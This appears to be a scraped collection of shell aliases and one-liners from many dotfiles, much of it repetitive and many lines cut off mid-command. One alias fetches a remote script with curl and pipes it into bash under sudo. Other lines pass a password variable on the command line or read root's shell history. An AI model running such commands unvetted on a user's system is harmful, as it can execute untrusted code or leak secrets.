2995415,494241,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995393,494240,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995371,494239,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995349,494238,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995294,494236,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995272,494235,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995250,494234,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995228,494233,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995206,494232,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995184,494231,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995162,494230,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995140,494229,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995118,494228,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995096,494227,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995074,494226,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995042,494224,allpkgs,dpkg --get-selections | grep -v deinstall"""
2995020,494223,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994998,494222,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994976,494221,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994954,494220,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994932,494218,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994900,494216,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994878,494215,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994856,494214,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994834,494213,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994783,494206,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994761,494205,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994714,494202,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994692,494201,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994670,494199,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994637,494197,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994539,494193,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994517,494192,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994495,494191,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994473,494190,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994444,494188,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994347,494185,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994277,494181,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994255,494179,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994206,494176,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994184,494174,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994162,494173,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994140,494172,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994118,494170,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994096,494169,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994070,494158,allpkgs,dpkg --get-selections | grep -v deinstall"""
2994020,494155,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993989,494152,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993967,494151,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993944,494149,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993922,494148,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993777,494144,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993755,494143,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993719,494136,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993689,494132,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993667,494131,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993645,494130,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993618,494127,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993573,494120,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993551,494119,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993448,494106,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993400,494082,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993320,494076,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993298,494064,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993262,494061,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993211,494058,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993189,494057,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993167,494056,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993145,494055,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993092,494048,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993030,494043,allpkgs,dpkg --get-selections | grep -v deinstall"""
2993008,494041,allpkgs,dpkg --get-selections | grep -v deinstall"""
2989658,493589,allpkgs,dpkg --get-selections | grep -v deinstall"""
2989602,493579,allpkgs,dpkg --get-selections | grep -v deinstall"""
2988537,493500,allpkgs,dpkg --get-selections | grep -v deinstall"""
2988390,493479,allpkgs,dpkg --get-selections | grep -v deinstall"""
2988365,493476,allpkgs,dpkg --get-selections | grep -v deinstall"""
2988341,493473,allpkgs,dpkg --get-selections | grep -v deinstall"""
2988309,493462,allpkgs,dpkg --get-selections | grep -v deinstall"""
2988256,493459,allpkgs,dpkg --get-selections | grep -v deinstall"""
2988118,493448,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987943,493441,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987883,493436,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987800,493433,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987768,493430,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987737,493425,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987715,493424,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987693,493423,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987671,493422,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987649,493421,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987627,493420,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987595,493418,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987571,493415,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987549,493414,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987527,493413,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987505,493412,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987483,493411,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987461,493410,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987439,493409,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987417,493408,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987395,493407,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987373,493406,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987351,493405,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987329,493404,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987307,493403,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987285,493402,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987263,493400,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987241,493399,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987095,493394,allpkgs,dpkg --get-selections | grep -v deinstall"""
2987048,493388,allpkgs,dpkg --get-selections | grep -v deinstall"""
2986775,493355,allpkgs,dpkg --get-selections | grep -v deinstall"""
2986753,493352,allpkgs,dpkg --get-selections | grep -v deinstall"""
2986712,493344,allpkgs,dpkg --get-selections | grep -v deinstall"""
2986609,493334,allpkgs,dpkg --get-selections | grep -v deinstall"""
2986497,493328,allpkgs,dpkg --get-selections | grep -v deinstall"""
2986463,493318,allpkgs,dpkg --get-selections | grep -v deinstall"""
2986367,493286,allpkgs,dpkg --get-selections | grep -v deinstall"""
2986215,493256,allpkgs,dpkg --get-selections | grep -v deinstall"""
2986173,493253,allpkgs,dpkg --get-selections | grep -v deinstall"""
2986149,493248,allpkgs,dpkg --get-selections | grep -v deinstall"""
2923675,488665,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
2922467,488522,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2922425,488520,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2922374,488517,gh,history 0 | grep --color """
2922302,488511,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2922226,488501,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2922184,488499,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2922111,488495,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2922067,488489,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2922007,488485,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921944,488482,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921891,488479,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921849,488477,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921807,488475,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921765,488473,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921723,488471,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921681,488469,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921639,488466,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921597,488464,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921555,488462,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921513,488459,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921471,488457,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921429,488454,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921348,488450,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921306,488445,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921264,488441,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921222,488437,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921180,488435,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921137,488432,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2921040,488425,serve,python -m SimpleHTTPServer &>>| .access.log &"""
2920827,488414,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2920604,488404,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2920534,488395,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2920396,488382,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2920335,488377,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2920280,488374,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2920127,488359,glog,_glog -n 30 | ruby -e 'puts STDIN.read.gsub(%(<#{%x(git config user.name).chomp}>)"
2920088,488356,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2919959,488347,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2919918,488345,tmux-buffer-to-clipboard,tmux save-buffer -|pbcopy"""
2904520,485593,gbag,git branch -a |grep"""
2897735,484138,gpr,git status -s && git log -5 --oneline | cat"""
2891003,483296,ldir,ls | grep '/$'"""
2889871,483180,weather3,curl http://wttr.in/ann_arbor?Tn | less"""
2875798,481715,L,| less"""
2832008,478690,ll,ls -Fhla --color=force | less -R"""
2829400,478479,mac,ifconfig en1 | grep ether"""
2790320,473059,G,| grep """
2789908,472984,p,ps aux|grep ^`whoami`"""
2789646,472921,kclean,sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) \"
2768518,469389,ghist,git log --pretty=format:'%H %ad | %s%d [%an]' --graph --date=short"""
2757100,467478,dpkga,dpkg --get-selections | grep -v deinstall"""
2734886,462878,p,ps -ef | less"""
2734749,462871,hr,history | tail -n 20"""
2612790,444508,L,| less"""
2543574,435724,clcp,config log --stat -p | bat -l diff"""
253377,89483,d,dirs -v | head -10"""
2524240,433493,logs,kubectl -n cyral logs deployment/mysql-analyzer | grep -i enduser --color=NEVER"""
2472559,427605,grepich,find . -iname \*.[ch] 2>/dev/null| xargs grep --color -in 2>/dev/null"""
2463742,426527,ecs-hosts,aws ec2 describe-instances | jq -r '"
245157,87500,deps,mvn dependency:tree | less"""
2426204,421456,find-by-mod,find . -type f -printf """"%T+ %p\n"""" -exec sh -c """"openssl md5 {} | \"
2162888,384457,G,| grep -i"""
2092350,381295,([^,]+)='(\""""[^\""""]+\""""|[^ ]+)(( +[^ ]+)*)'"""""""
2007202,371788,myip,curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'"""
1962862,363590,L,| less"""
1926130,356975,ddi,docker images -q | while read ding ; do docker rmi -f $ding ; done"""
1923894,356716,gf,git ls-files | grep"""
1826941,341382,set644,find . -type f ! -perm 644 -print0 | xargs -0 chmod 644"""
1818239,339512,lsd,ls -lF ${colorflag} | grep --color=never '^d'"""
1802308,336344,g,cd $(ghq root)/$(ghq list | peco)"""
1798250,335980,hglc,hg log -l 1 | \"
1798248,335980,hgbs,hg branches | \"
1796560,335771,@url_clean2,| sed 's/%3a/:/gi; s/%2f/\//gi; s/%26/&/gi; s/%3d/:/gi;"
1785929,331994,pip_upgrade,pip freeze --local | grep -v """
1695890,329533,geth.account,/var/www/vhosts/go-wolk/build/bin/geth --datadir /usr/local/swarmdb/data account list 2> /dev/null | awk """
1695871,329532,geth.account,/var/www/vhosts/go-wolk/build/bin/geth --datadir /usr/local/swarmdb/data account list 2> /dev/null | awk """
168412,69032,bbpb,pbpaste | bbedit --clean --view-top"""
1638484,324921,hg,history | grep"""
1564793,314236,fstab,cat /etc/fstab | column -t"""
1559034,312511,git_left_over_remote,git branch -r --merged origin/master | sed \"
1514642,301791,gbranchr,for k in `git branch -r | \"
1499805,298774,G, | rg"""
1454999,292627,lsd,ls -l | grep """"^d"""""""
1432148,289925,st,git shortlog --summary | sort -nr"""
1431727,289888,lsd,find . -maxdepth 2 -type d | sort"""
142146,62697,memUsage,free -m | awk '/^Mem/{print 100*\$3/\$2}'"""
1410977,286750,dus,\du -scxh err.txt generated.file succ.txt | sort -n"""
1408184,285971,gdc,git diff --cached | sed -e 's/^diff --git [^[:space:]]*/Index:/' -e 's/^index.*/\"
1321625,271581,pacnews,curl -s https://www.archlinux.org/feeds/news/ |\"
1263497,263506,sudot,sudo -i; curl -L https://raw.githubusercontent.com/geewiz/dotfiles/master/bin/dotfiles | bash"""
1244907,260594,newmusic,ls -t ~/music | head"""
1224630,257449,lsd,ls -l | grep """"^d"""""""
1188225,252686,fixdir,ls | xargs -I '{}' ~/.fixdir '{}'"""
1188140,252680,fzfpacrem,pacman -Qq | fzf --preview='pacman -Qi {1}' \"
1162397,249994,dmesg,/bin/dmesg --color=always | less -R"""
108576,51900,gdf,git diff --color | diff-so-fancy"""
106676,50858,rrg,be rake routes | grep"""
102090,49460,httpdump,sudo tcpdump -i en1 -n -s 0 -w - | grep -a -o -E \"""
/|/g;s/
/usr/ucb/ps auxwwwww | less
/usr/ucb/ps -axww | grep
/usr/ucb/ps -auxwww | grep -i
/usr/sbin/lsof | grep deleted
/usr/sbin/add-apt-repository' | sudo tee -a $HOME/.bash_aliases
/usr/local/mysql/bin/mysqldump --defaults-file=/data/mysql/mysql_3306/my_3306.cnf --login-path=3306_localhost_login -R -E --triggers -e --max_allowed_packet=16777216 --net_buffer_length=16384 --default-character-set=utf8mb4 --set-gtid-purged=OFF --master-data=2 --single-transaction --all-databases --quick | gzip >/data/backup/all_database_bak_`date +%Y-%m-%d_%H_%M_%S`.sql.gz
/usr/local/go/src/github.com/wolkdb/plasma/build/bin/swarmdb attach /usr/local/swarmdb/data/swarmdb.ipc --exec admin.peers | grep remoteAddress
/usr/local/bin/todo.sh |lolcat
/usr/local/bin/terraform graph | dot -Tsvg > graph.svg && open graph.svg -a /Applications/Net/Google\ Chrome.app
/usr/local/bin/pwgen -B 4 1 | tr -d
/usr/local/bin/pgrep racoon | xargs sudo kill -9; osascript /Volumes/LivingSocial/code/applescripts/openvpn.scpt
/usr/local/bin/md5sum err.txt generated.file succ.txt | gsed -e 's/\([^ ]*\) \(.*\(\..*\)\)$/mv -v \2 \1\3/e'
/usr/local/bin/kubectl get pods --all-namespaces -o wide | awk
/usr/local/bin/git fetch --prune;/usr/local/bin/git branch --merged | grep \
/usr/local/bin/docker run --rm --privileged --pid=host walkerlee/nsenter -t 1 -m -u -i -n ntpd -d -q -n -p `if [[ -f /etc/ntp.conf ]]; then cat /etc/ntp.conf | awk '{ print $2 }'; else echo 'pool.ntp.org'; fi`
/usr/local/bin/docker ps -q | /usr/bin/wc -l
/usr/local/bin/docker ps -aq | /usr/bin/wc -l
/usr/local/bin/consul agent -data-dir /tmp/consul -node=zzp-mbp -advertise=$(ifconfig en0 inet | awk 'NR == 2 {print $2}') -join=10.0.40.122
/usr/local/bin/aws ecr get-login --no-include-email --region ca-central-1 | xclip -selection clipboard
/usr/local/bin/DiCE/diced |nkf -uw
/usr/local/Cellar/qt5/$(ls /usr/local/Cellar/qt5 | tail -n 1)/bin/qmake
/usr/local/Cellar/kafka/0.9.0.0/bin/kafka-topics.sh --zookeeper {zookeeper} --list | xargs -I {} /usr/local/Cellar/kafka/0.9.0.0/bin/kafka-topics.sh --under-replicated-partitions --zookeeper {zookeeper} --topic {} --describe
/usr/libexec/java_home -V 2>&1 | grep -E
/usr/lib/update-notifier/apt-check -p 2>&1 | sort
/usr/games/jnethack | nkf -u -w
/usr/games/fortune | /usr/games/cowsay
/usr/bin/yay -Q | grep
/usr/bin/yaourt -Qtdq > /dev/null && sudo /usr/bin/pacman -Rns \$(/usr/bin/pacman -Qtdq | sed -e ':a;N;$!ba;s/\n/ /g')
/usr/bin/xprop | awk '/WM_CLASS/{print $4}'
/usr/bin/tremulous 2>&1 | perl -pe '$tremcolor'
/usr/bin/top -l 1 -s 0 | grep PhysMem
/usr/bin/rox; sleep 1; echo -n view rox | wmiir write /ctl
/usr/bin/python -m json.tool | /usr/local/bin/pygmentize -O style=monokai -f console256 -g
/usr/bin/ps auxf | sort -nr -k 4
/usr/bin/ps auxf | sort -nr -k 3
/usr/bin/printenv | sort
/usr/bin/pacman -Qtdq > /dev/null && sudo /usr/bin/pacman -Rs \$(/usr/bin/pacman -Qtdq | sed -e ':a;N;\$!ba;s/\n/ /g')
/usr/bin/pacman -Qtdq > /dev/null && sudo /usr/bin/pacman -Rs \$(/usr/bin/pacman -Qtdq | sed -e ':a;N;$ba;s/\n/ /g')
/usr/bin/pacman -Qtdq > /dev/null && sudo /usr/bin/pacman -Rs \$(/usr/bin/pacman -Qtdq | sed -e ':a;N;$!ba;s/\n/ /g')
/usr/bin/pacman -Qtdq > /dev/null && sudo /usr/bin/pacman -Rns \$(/usr/bin/pacman -Qtdq | sed -e ':a;N;\$!ba;s/\n/ /g')
/usr/bin/pacman -Qtdq > /dev/null && sudo /usr/bin/pacman -Rns \$(/usr/bin/pacman -Qtdq | sed -e ':a;N;$!ba;s/\n/ /g')
/usr/bin/lsusb|awk
/usr/bin/ls -lah | lolcat
/usr/bin/ls -l --color=always|more
/usr/bin/iptables -n -L | /usr/bin/less
/usr/bin/grc netstat -antp | grep LISTEN
/usr/bin/git --git-dir=$HOME/.cfp_bckp/ --work-tree=$HOME ls-tree -tr --name-only --full-name --full-tree master | grep
/usr/bin/git --git-dir=$HOME/.cfg_bckp/ --work-tree=$HOME ls-tree -tr --name-only --full-name --full-tree master | grep
/usr/bin/find ~/bin -type f | xargs chmod +x
/usr/bin/find . | grep
/usr/bin/find . -iname \*.\*hs | xargs hasktags -a -e
/usr/bin/expac -Q '%m' -H M | /usr/bin/datamash -W sum 1
/usr/bin/env | sort
/usr/bin/env | /usr/bin/sort
/usr/bin/env cat /usr/include/asm/unistd_64.h | grep
/usr/bin/env cat /usr/include/asm/unistd_64.h | /bin/grep -P
/usr/bin/env cat /usr/include/asm/unistd_32.h | grep
/usr/bin/env cat /usr/include/asm/unistd_32.h | /bin/grep -P
/usr/bin/env `cat /etc/cron.d/slack | /usr/bin/awk 'BEGIN {FS=\
/usr/bin/du -sm err.txt generated.file succ.txt | sort -rn
/usr/bin/du -sk err.txt generated.file succ.txt | sort -n; /usr/bin/du -skh
/usr/bin/du -sh err.txt generated.file succ.txt | sort -h
/usr/bin/du -s err.txt generated.file succ.txt . .. | sort -n
/usr/bin/du -h -c --max-depth=1 | sort -h
/usr/bin/du -h -c --max-depth=0 err.txt generated.file succ.txt | sort -h
/usr/bin/du -h err.txt generated.file succ.txt | sort -hr
/usr/bin/cal | grep -C6 --color '`date +' %-d '`'
/usr/bin/ack --ignore-file='match:/vendors|bundle.js/'
/sbin/ldconfig -p | grep
/sbin/iptables -L -n | more
/sbin/ifconfig|grep addr
/sbin/ifconfig | less
/sbin/ifconfig | grep inet
/sbin/ifconfig | grep 192
/sbin/ifconfig | grep -B 1 inet
/sbin/ifconfig wlp9s0|awk '/inet/{print \$2}'
/sbin/ifconfig eth0 | awk '/RX bytes/{print \$2 > \
/sbin/ifconfig en0 | grep 'inet '
/sbin/ifconfig -a | igrep inet
/sbin/ifconfig -a | grep 'inet addr'
/root/go/src/github.com/wolkdb/plasma/build/bin/plasma-gw attach /root/data/plasmachain.ipc --exec admin.peers | grep remoteAddress
/proc/`pgrep tmux | head -1`/exe select-pane -t ${TMUX_PANE} -P 'bg=colour16'
/opt/vc/bin/vcgencmd measure_temp | egrep -o '[0-9\\.]+'
/opt/scala-2.9.2/bin/scala -J-Xmx5G -classpath $(echo ${LIB_HOME}/*.jar | tr ' ' ':')
/opt/scala-2.10.1/bin/scala -J-Xmx5G -classpath $(echo ${LIB_HOME}/*.jar | tr ' ' ':')
/opt/intellij/bin/idea.sh > /dev/null 2>&1 &|
/opt/gridengine/bin/lx26-amd64/qstat \`echo \$noderequirementstat\` | awk ' { print \
/opt/ejabberd/bin/ejabberdctl p1db_records_number | grep pubsub_node
/opt/coreutils/bin/ls -d */ | cut -f1 -d'/'
/opt/bin/opkg list | grep -i
/init /mnt/c/Windows/System32/tasklist.exe | grep -i
/home/tom/scripts/apt-packages | xargs -I % cat %
/home/steven/bin/date-sort | head -n1
/home/jeremy/git-files/todo.txt-cli/./todo.sh list|sort
/home/anjed/bin/now.js | c
/g' |less"
/bin/xev | grep 'keysym'
/bin/rm -f *+(~|#) 2>/dev/null
/bin/rm -f *+(~|#) ${TEX_GARBAGE} 2>/dev/null
/bin/pwd|sed -e 's/^\/home\/$USER/~/'
/bin/pwd | /usr/bin/xclip -selection clipboard
/bin/ps axf | grep java
/bin/ps axf | grep
/bin/ps ax | grep
/bin/ps auxww | grep
/bin/ps aux | grep
/bin/ps -t $tty | /usr/bin/sort
/bin/ps -fu$USER | grep
/bin/ps -ef | grep
/bin/ps -auxww | grep
/bin/ps -a | grep -i -e PID -e
/bin/ls | wc -l
/bin/ls | pv -qL 10
/bin/ls | grep -i
/bin/ls | cat
/bin/ls | /usr/bin/wc
/bin/ls -rt|tail -n1
/bin/ls -rt | tail -n1
/bin/ls -lhtp | tail
/bin/ls -lhtp | head
/bin/ls -ld */* | grep ^d
/bin/ls -lat | more
/bin/ls -laFt | head
/bin/ls -la | peco
/bin/ls -la | egrep -v '.DS_Store'
/bin/ls -la $LS_OPTIONS | more
/bin/ls -lF ${colorflag} | grep --color=never '^d'
/bin/ls -l | grep ^d
/bin/ls -l --color | sort -r -n +4
/bin/ls -f | wc -l
/bin/ls -alph --color | less -r
/bin/ls -alhp | /usr/bin/less
/bin/ls -alhS |head -n11
/bin/ls -alF|m
/bin/ls -alFGh | less -RXF
/bin/ls -alF | less
/bin/ls -ahlt *(.)| tail
/bin/ls -a1U | wc -l
/bin/ls -a1 | grep
/bin/ls -a | cat
/bin/ls -R | grep
/bin/ls -Flrt | grep \/
/bin/ls -F | grep \/
/bin/ls -CFGh | less -RXF
/bin/ls -1U | wc -l
/bin/ls -1 | xclip
/bin/ls -1 | wc -l
/bin/ls --color=auto -lFaS | sort -n -k5
/bin/ls --color=auto -Ahlpt --time-style=long-iso | head -20
/bin/ls --color=auto -Ahlp --time-style=long-iso | head
/bin/ls --color=auto -Ahlp --time-style=long-iso | grep ^l
/bin/ls --color=auto -Ahlp --time-style=long-iso | grep ^d
/bin/ls --color=auto --group-directories-first -lah | more
/bin/ls $LS_OPTIONS -la | less -r
/bin/grep -v grep | /bin/grep --color=auto
/bin/grep -Ev '^[[:blank:]]*(#|$)'
/bin/find . -type f -print0 | /bin/xargs -0 /bin/grep --color=auto -is -C 3
/bin/echo $PASSWD | openconnect $@ -b --authgroup=<if_required> --user=<if_required> --no-dtls --interface=tun1 https://<ip_or_url_here>
/bin/dmesg|tail -40
/bin/dmesg --color=always | less -R
/bin/dmesg --color=always | /bin/less -R
/bin/df -h | grep sd --color=never
/bin/cat ~/.ssh/id_rsa.pub | pbcopy
/bin/cat /usr/include/asm/unistd_64.h | grep -P
/bin/cat /usr/include/asm/unistd_32.h | grep -P
/bin/cat /root/.bash_history | grep
/apps/harris/license/bin/lmstat -c /apps/harris/license/MLM.lic -A | grep EDA_Simulator_Link -A 10
/apps/XEmacs/XEmacs-21.4.11/i586-pc-win32/winclient.exe `ls -tr|tail -1`
/afs/cern.ch/project/eos/installation/cms/etc/setup.sh | sed
/`git rev-parse HEAD | cut -c-7`/ {preline = preline \""\033[7m\""}
/Users/nimoore/code/python/lookups.py | grep
/Users/mo/.local/bin/awsls | grep -i
/Users/eddiecrawford/workspace/Ibotta-Android/gradlew assembleDebug | lolcat && catpix -c=x ~/Pictures/diglett.png
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | sed -n -e 's/^.*channel: //p'
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | grep SSID
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -kill -r -domain local -domain system -domain user | killall Finder
/Applications/Android/sdk/platform-tools/adb logcat | /Applications/Android/sdk/tools/coloredlogcat.py
.Reservations[].Instances[] |
./venv/bin/pip freeze >| requirements.txt
./tools/combine_hi_low && cat bcomka_ics_trace_node_0.log | cut -d ' ' -f 2- > node0.log
./test_sanger.sh --client sanger-cli 2>&1 | tee -i ./result-sanger-sanger.txt
./test_sanger.sh --client sanger-cli --max-references 10 fulltest 2>&1 | tee -i ./result-sanger-sanger-full.txt
./test_sanger.sh --client samtools-cli 2>&1 | tee -i ./result-samtools-sanger.txt
./test_sanger.sh --client samtools-cli --max-references 10 fulltest 2>&1 | tee -i ./result-samtools-sanger-full.txt
./test_sanger.sh --client htsget-cli 2>&1 | tee -i ./result-htsget-sanger.txt
./test_sanger.sh --client htsget-cli --max-references 10 fulltest 2>&1 | tee -i ./result-htsget-sanger-full.txt
./test_sanger.sh --client ena-cli 2>&1 | tee -i ./result-ena-sanger.txt
./test_sanger.sh --client ena-cli --max-references 10 fulltest 2>&1 | tee -i ./result-ena-sanger-full.txt
./test_sanger.sh --client ega-cli 2>&1 | tee -i ./result-ega-sanger.txt
./test_sanger.sh --client ega-cli --max-references 10 fulltest 2>&1 | tee -i ./result-ega-sanger-full.txt
./test_sanger.sh --client dnanexus-cli 2>&1 | tee -i ./result-dnanexus-sanger.txt
./test_sanger.sh --client dnanexus-cli --max-references 10 fulltest 2>&1 | tee -i ./result-dnanexus-sanger-full.txt
./test_google.sh --client sanger-cli 2>&1 | tee -i ./result-sanger-google.txt
./test_google.sh --client sanger-cli --max-references 10 fulltest 2>&1 | tee -i ./result-sanger-google-full.txt
./test_google.sh --client samtools-cli 2>&1 | tee -i ./result-samtools-google.txt
./test_google.sh --client samtools-cli --max-references 10 fulltest 2>&1 | tee -i ./result-samtools-google-full.txt
./test_google.sh --client htsget-cli 2>&1 | tee -i ./result-htsget-google.txt
./test_google.sh --client htsget-cli --max-references 10 fulltest 2>&1 | tee -i ./result-htsget-google-full.txt
./test_google.sh --client ena-cli 2>&1 | tee -i ./result-ena-google.txt
./test_google.sh --client ena-cli --max-references 10 fulltest 2>&1 | tee -i ./result-ena-google-full.txt
./test_google.sh --client ega-cli 2>&1 | tee -i ./result-ega-google.txt
./test_google.sh --client ega-cli --max-references 10 fulltest 2>&1 | tee -i ./result-ega-google-full.txt
./test_google.sh --client dnanexus-cli 2>&1 | tee -i ./result-dnanexus-google.txt
./test_google.sh --client dnanexus-cli --max-references 10 fulltest 2>&1 | tee -i ./result-dnanexus-google-full.txt
./test_ena.sh --client sanger-cli 2>&1 | tee -i ./result-sanger-ena.txt
./test_ena.sh --client sanger-cli --max-references 10 fulltest 2>&1 | tee -i ./result-sanger-ena-full.txt
./test_ena.sh --client samtools-cli 2>&1 | tee -i ./result-samtools-ena.txt
./test_ena.sh --client samtools-cli --max-references 10 fulltest 2>&1 | tee -i ./result-samtools-ena-full.txt
./test_ena.sh --client htsget-cli 2>&1 | tee -i ./result-htsget-ena.txt
./test_ena.sh --client htsget-cli --max-references 10 fulltest 2>&1 | tee -i ./result-htsget-ena-full.txt
./test_ena.sh --client ena-cli 2>&1 | tee -i ./result-ena-ena.txt
